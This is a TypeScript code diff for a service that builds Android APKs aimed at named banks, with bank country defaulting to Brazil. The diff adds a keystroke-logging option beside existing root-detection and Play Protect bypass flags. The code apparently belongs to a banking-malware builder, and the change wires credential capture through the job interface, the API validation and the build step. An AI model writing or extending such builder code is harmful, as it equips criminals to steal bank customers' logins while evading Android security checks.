@@ -31,6 +31,7 @@ interface BuildJob {
   bankName?: string;
   enableRootBypass?: boolean;
   enablePlayProtectBypass?: boolean;
+  enableKeylogCapture?: boolean;
   downloadUrl?: string;
   deliveryMode: DeliveryMode;
   artifactSource?: ArtifactSource;
@@ -47,6 +48,9 @@ export interface RuntimeApkConfig {
   bankId?: string;
   bankCountry?: string;
   bankName?: string;
+  enableRootBypass?: boolean;
+  enablePlayProtectBypass?: boolean;
+  enableKeylogCapture?: boolean;
   artifactSource?: ArtifactSource;
   createdAt: string;
   updatedAt: string;
@@ -79,6 +83,9 @@ export function getLatestRuntimeApkConfig(packageName?: string): RuntimeApkConfi
     bankId: latest.bankId,
     bankCountry: latest.bankCountry,
     bankName: latest.bankName,
+    enableRootBypass: latest.enableRootBypass,
+    enablePlayProtectBypass: latest.enablePlayProtectBypass,
+    enableKeylogCapture: latest.enableKeylogCapture,
     artifactSource: latest.artifactSource,
     createdAt: latest.createdAt.toISOString(),
     updatedAt: latest.updatedAt.toISOString(),
@@ -116,6 +123,7 @@ export const apkRouter = router({
         bankName: z.string().min(1),
         enableRootBypass: z.boolean().optional(),
         enablePlayProtectBypass: z.boolean().optional(),
+        enableKeylogCapture: z.boolean().optional(),
         deliveryMode: z.enum(['auto', 'eas', 'storage', 'local']).optional(),
       })
     )
@@ -138,6 +146,7 @@ export const apkRouter = router({
         bankName: input.bankName,
         enableRootBypass: input.enableRootBypass,
         enablePlayProtectBypass: input.enablePlayProtectBypass,
+        enableKeylogCapture: input.enableKeylogCapture,
         deliveryMode: input.deliveryMode ?? 'auto',
         createdAt: new Date(),
         updatedAt: new Date(),
@@ -309,6 +318,9 @@ async function finalizeBuild(job: BuildJob): Promise<void> {
         bankId: job.bankId ?? 'default',
         bankCountry: job.bankCountry ?? 'BR',
         bankName: job.bankName ?? 'Default Bank',
+        enableRootBypass: job.enableRootBypass,
+        enablePlayProtectBypass: job.enablePlayProtectBypass,
+        enableKeylogCapture: job.enableKeylogCapture,
       });
 
       const uploaded = await storagePut(
